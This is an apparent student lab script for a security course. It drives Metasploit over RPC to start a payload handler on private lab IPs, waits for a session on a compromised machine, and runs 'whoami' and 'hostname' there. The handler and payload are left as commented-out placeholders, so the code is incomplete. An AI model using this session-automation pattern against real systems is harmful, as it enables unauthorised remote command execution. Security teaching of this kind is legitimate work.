#!/usr/bin/python3
'''
Michael Epstein
OPSC-540-81
'''

#import statements
from metasploit.msfrpc import MsfRpcClient
import six
import time 

#code
def authenticate():    
    return MsfRpcClient('test', ssl=False, username='msf')
def exec_cmd(mtr, cmd):    
    print('Executing cmd: '+cmd)    
    mtr.write(cmd+'\n')    
    time.sleep(1) # wait for the data to become available    
    print(mtr.read())

rpc = authenticate()
    # set handler here# 
    # handler = ...

    # # set payload here# 
    # payload = ...
payload['LHOST'] = "192.168.1.1" # local external ip
    
handler['RHOST'] = "192.168.1.3" # metasploit ip
    
session = handler.execute(payload=payload)
# wait until we have an active session
while len(rpc.sessions.list) == 0:    
    time.sleep(10)

# got a connection
for client_id, client_info in six.iteritems(rpc.sessions.list):    
    mtr = rpc.sessions.session(client_id)    
    cmd = 'whoami'    
    exec_cmd(mtr, cmd)    
    cmd = 'hostname'    
    exec_cmd(mtr, cmd)